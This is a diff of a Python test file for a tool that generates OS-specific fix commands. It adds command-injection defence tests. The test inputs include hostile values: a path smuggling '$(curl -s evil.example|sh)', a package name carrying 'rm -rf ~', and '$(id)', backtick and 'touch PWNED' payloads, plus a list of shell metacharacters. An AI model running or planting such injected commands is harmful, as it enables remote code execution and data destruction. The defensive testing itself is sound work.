@@ -75,8 +75,8 @@ def test_pip_uses_py_launcher_on_windows():
     guide = build_guide(dep("requirements.txt", "PyPI", package="django", target="4.2.16"))
 
     up = action(guide, "upgrade_dependency")
-    assert lines(up, "windows") == ['py -m pip install "django>=4.2.16"']
-    assert lines(up, "macos") == ['python3 -m pip install "django>=4.2.16"']
+    assert lines(up, "windows") == ["py -m pip install 'django>=4.2.16'"]
+    assert lines(up, "macos") == ["python3 -m pip install 'django>=4.2.16'"]
     assert any("requirements.txt" in m for m in up.manual_steps)
 
 
@@ -175,3 +175,89 @@ async def test_environment_reaches_prompt_and_result(fake_vllm, findings):
     assert "npm install next@15.2.3" not in prompt  # 명령 자체는 모델에 넘기지 않음
     assert result.guide.environment.os == "windows"
     assert lines(action(result.guide, "upgrade_dependency"), "windows") == ["npm install next@15.2.3"]
+
+
+# ── 명령 주입 방어 (#35 리뷰) ──
+
+HOSTILE = ["$(", "`", ";", "|", "&", ">", "<"]
+
+
+def all_command_text(guide) -> str:
+    return "\n".join(line for a in guide.actions for b in a.commands for line in b.lines)
+
+
+def test_review_repro_lockfile_path_is_not_executed():
+    f = dep("web$(curl -s evil.example|sh)/package-lock.json")
+
+    guide = build_guide(f, UserEnvironment(os="linux"))
+
+    commit = action(guide, "commit_lockfile")
+    assert not commit.commands and commit.manual_steps
+    assert "$(" not in all_command_text(guide)
+
+
+def test_review_repro_env_path_is_not_executed():
+    guide = build_guide(secret(path="cfg;touch PWNED;/.env", rule="generic-api-key"), UserEnvironment(os="linux"))
+
+    untrack = action(guide, "stop_tracking_env")
+    assert not untrack.commands and untrack.manual_steps
+    assert "PWNED" not in all_command_text(guide)
+
+
+@pytest.mark.parametrize(
+    ("package", "version"),
+    [
+        ("lodash;rm -rf ~", "4.17.21"),
+        ("lodash", "4.17.21$(id)"),
+        ("-g", "1.0.0"),  # 옵션으로 해석되는 인자 주입
+        ("lodash`id`", "1.0.0"),
+    ],
+)
+def test_hostile_package_or_version_gets_no_commands(package, version):
+    guide = build_guide(dep("package-lock.json", package=package, target=version))
+
+    assert guide.actions[0].id == "upgrade_dependency_manual"
+    text = all_command_text(guide)
+    assert not any(h in text for h in HOSTILE)
+    assert "-g" not in text.split()
+
+
+def test_scoped_package_is_quoted_for_powershell():
+    guide = build_guide(dep("package-lock.json", package="@supabase/supabase-js", target="2.45.0"))
+
+    up = action(guide, "upgrade_dependency")
+    # '@' 로 시작하는 인자는 PowerShell 에서 일관되게 인용합니다 ('@이름' 은 splatting 으로 사라짐)
+    assert lines(up, "windows") == ["npm install '@supabase/supabase-js@2.45.0'"]
+    assert lines(up, "linux") == ["npm install @supabase/supabase-js@2.45.0"]
+
+
+def test_paths_with_spaces_are_not_turned_into_commands():
+    guide = build_guide(dep("my app/package-lock.json"))
+
+    assert not action(guide, "commit_lockfile").commands
+
+
+@pytest.mark.parametrize("payload", ["x;touch PWNED", "x$(touch PWNED)", "x`touch PWNED`", "x|touch PWNED", "x' ; touch PWNED ; '"])
+def test_untrusted_fields_never_reach_commands(payload):
+    """탐지 결과에서 오는 모든 칸에 공격 문자열을 넣어도 명령에는 나타나지 않아야 합니다."""
+    cases = [
+        dep(f"{payload}/package-lock.json"),
+        dep("package-lock.json", package=payload),
+        dep("package-lock.json", target=payload),
+        secret(path=f"{payload}/.env"),
+        secret(rule=payload),
+        FindingInput(
+            fingerprint="c", tool="semgrep", category="code", rule_id=payload, title="t", severity="high",
+        ),  # fmt: skip
+        FindingInput(
+            fingerprint="r", tool="own", category="config", rule_id="rls-disabled", title="RLS", severity="high",
+            snippet=f"create table {payload} (id int);",
+        ),  # fmt: skip
+    ]
+    for f in cases:
+        for os_ in ("windows", "macos", "linux"):
+            guide = build_guide(f, UserEnvironment(os=os_, hosting="vercel"))
+            # 규칙 ID 는 [A-Z0-9_] 환경 변수 이름으로만 바뀌어 들어갑니다 (X_TOUCH_PWNED). 실행 가능한 원문이 없어야 합니다
+            assert "touch PWNED" not in all_command_text(guide), (f.fingerprint, os_)
+            sql = [m for a in guide.actions for m in a.manual_steps if m.startswith("alter table")]
+            assert not any("touch PWNED" in line for line in sql)
